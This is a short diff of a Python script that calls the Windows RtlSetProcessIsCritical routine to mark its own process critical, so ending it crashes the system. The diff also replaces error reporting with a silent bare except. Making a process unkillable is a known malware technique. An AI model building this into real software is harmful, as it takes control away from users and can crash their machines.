@@ -23,13 +23,12 @@ def set_process_as_critical():
     try:
         result = RtlSetProcessIsCritical(1, 0, 0)
         
-        if result == 0:
-            print("Process is now critical.")
-        else:
-            print("Failed to set the process as critical.")
+        if result == 0: print("Process is now critical.")
+        else: print("Failed to set the process as critical.")
     
-    except Exception as e:
-        print(f"Error: {e}")
+    except:
+        # print(f"Error: {e}")
+        pass
 
 def generate_random_name(length=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
